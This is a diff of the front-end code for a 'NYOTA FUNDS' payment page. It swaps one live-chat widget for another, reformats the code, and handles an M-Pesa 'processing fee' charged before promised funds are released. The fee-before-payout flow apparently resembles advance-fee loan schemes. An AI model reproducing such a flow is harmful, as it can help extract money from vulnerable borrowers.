@@ -1,24 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
-  <!-- Brevo Conversations {literal} -->
-<script>
-    (function(d, w, c) {
-        w.BrevoConversationsID = '6973a340153840fff105d60b';
-        w[c] = w[c] || function() {
-            (w[c].q = w[c].q || []).push(arguments);
-        };
-        var s = d.createElement('script');
-        s.async = true;
-        s.src = 'https://conversations-widget.brevo.com/brevo-conversations.js';
-        if (d.head) d.head.appendChild(s);
-    })(document, window, 'BrevoConversations');
-</script>
-<!-- /Brevo Conversations {/literal} -->
+<!-- Removed Brevo Conversations code for live chat integration -->
+
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Payment 1 – Processing Fee</title>
-<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="style.css" />
 </head>
 <body>
 
@@ -37,18 +25,27 @@
         <input type="text" id="senderName" placeholder="Enter Your Full Name" required>
         <input type="text" id="senderPhone" placeholder="Enter Your Phone Number" required>
         <button type="submit" id="payBtn">Pay Now</button>
-         <button type="button" id="retryBtn" style="display:none;margin-top:10px;">
-    Retry Payment
-</button>
+        <button type="button" id="retryBtn" style="display:none;margin-top:10px;">
+            Retry Payment
+        </button>
     </form>
 
     <p style="margin-top:15px; font-size:14px; color:gray;">
         Please wait a few minutes for your payment to be processed. You will be automatically redirected to the next step after your payment is confirmed. You can also contact admin via live chat for support.
     </p>
 
-    
+    <!-- LiveChat Widget -->
+    <script>
+        window.__lc = window.__lc || {};
+        window.__lc.license = 19513072;
+        window.__lc.integration_name = "manual_channels";
+        window.__lc.product_name = "livechat";
+        (function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
+    </script>
+    <noscript><a href="https://www.livechat.com/chat-with/19513072/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
+</div>
 
- <script>
+<script>
  // ===== LOAD USER NAME FROM LOCAL STORAGE =====
   const users = JSON.parse(localStorage.getItem("nyota_users") || "[]");
   const phone = localStorage.getItem("userPhone");
@@ -67,7 +64,7 @@
    const REDIRECT_DELAY_MS = 5 * 1000; // 5 seconds
    let redirectSecondsLeft = Math.floor(REDIRECT_DELAY_MS / 1000);
 
-// ================== LOAD FEE ==================
+   // ================== LOAD FEE ==================
 const fund = JSON.parse(localStorage.getItem("selectedFund"));
 
 if (!fund || !fund.fee) {
@@ -98,7 +95,7 @@ function showBadge(text, color) {
     badge.innerHTML = `<strong style="color:${color}">${text}</strong>`;
 }
 
- function showPopup(title, message) {
+function showPopup(title, message) {
     document.getElementById("popupTitle").innerText = title;
     document.getElementById("popupMessage").innerHTML = message;
     document.getElementById("popupOverlay").style.display = "block";
@@ -138,7 +135,7 @@ function clearRedirectTimers() {
 // ================== FORM SUBMIT ==================
 const form = document.getElementById("payForm");
 const button = document.getElementById("payBtn");
- const retryBtn = document.getElementById("retryBtn");
+const retryBtn = document.getElementById("retryBtn");
 
 retryBtn.onclick = () => {
     retryBtn.style.display = "none";
@@ -179,25 +176,24 @@ form.addEventListener("submit", async (e) => {
 
         const data = await res.json();
 
-       if (data.success) {
-    retryBtn.style.display = "none";
+        if (data.success) {
+            retryBtn.style.display = "none";
 
-    showBadge("🟡 STK sent. Enter your M-Pesa PIN", "orange");
+            showBadge("🟡 STK sent. Enter your M-Pesa PIN", "orange");
 
-    button.disabled = false;
-    button.innerText = "Pay Now";
+            button.disabled = false;
+            button.innerText = "Pay Now";
 
-    localStorage.setItem("paymentReference", data.reference);
+            localStorage.setItem("paymentReference", data.reference);
 
-    pollReceipt(data.reference);
-}  else {
-    alert(data.error || "Payment failed");
-    showBadge("🔴 STK push failed. Please retry.", "red");
-    button.disabled = false;
-    button.innerText = "Pay Now";
-   retryBtn.style.display = "block";
-}
-
+            pollReceipt(data.reference);
+        } else {
+            alert(data.error || "Payment failed");
+            showBadge("🔴 STK push failed. Please retry.", "red");
+            button.disabled = false;
+            button.innerText = "Pay Now";
+            retryBtn.style.display = "block";
+        }
     } catch (err) {
         alert("Server connection failed. Try again.");
         button.disabled = false;
@@ -210,7 +206,7 @@ form.addEventListener("submit", async (e) => {
 // ================== RECEIPT POLLING ==================
 function pollReceipt(reference) {
     let attempts = 0;
-   retryBtn.style.display = "none";
+    retryBtn.style.display = "none";
 
     const interval = setInterval(async () => {
         attempts++;
@@ -253,11 +249,9 @@ function pollReceipt(reference) {
                             clearRedirectTimers();
                         }
                     }, 1000);
-
                 } else if (r.status === "cancelled" || r.status === "stk_failed" || r.status === "error") {
                     // Failed or cancelled: show failed badge, show popup but NO redirect
                     showBadge("🔴 Payment failed or cancelled. Please retry.", "red");
-
                     showPopup(
                         "Payment Receipt",
                         "Reference: " + r.reference + "<br>" +
@@ -265,7 +259,6 @@ function pollReceipt(reference) {
                         "Amount: KES " + r.amount + "<br><br>" +
                         (r.status_note ? ("Note: " + r.status_note) : "")
                     );
-
                 } else {
                     // Any other statuses: show popup but no redirect by default
                     showPopup(
@@ -302,24 +295,20 @@ function updateProcessingPopup(receipt) {
         "Reference: <strong>" + receipt.reference + "</strong><br>" +
         "Status: <strong>PAYMENT SUCCESSFUL</strong><br>" +
         "Amount Paid: <strong>KES " + receipt.amount + "</strong><br><br>" +
-
         "✅ <strong>Thank you for choosing NYOTA FUNDS!</strong><br>" +
         "We have successfully received and verified your processing fee.<br><br>" +
-
         "💼 <strong>Your funds are now being prepared.</strong><br>" +
         "To complete the process, you will now choose where you would like to receive your money " +
-        "(M-Pesa,Airtelmoney or Bank account).<br><br>" +
-
+        "(M-Pesa, Airtelmoney or Bank account).<br><br>" +
         "⏳ <strong>This will only take a few seconds.</strong>" +
         countdownText +
-
         "<br><br><em>You may tap OK to continue immediately.</em>";
 
     showPopup("NYOTA FUNDs – Payment Confirmed", msg);
 }
 
 // If a payment was previously initiated, resume polling
- const savedRef = localStorage.getItem("paymentReference");
+const savedRef = localStorage.getItem("paymentReference");
 if (savedRef) {
     pollReceipt(savedRef);
 }
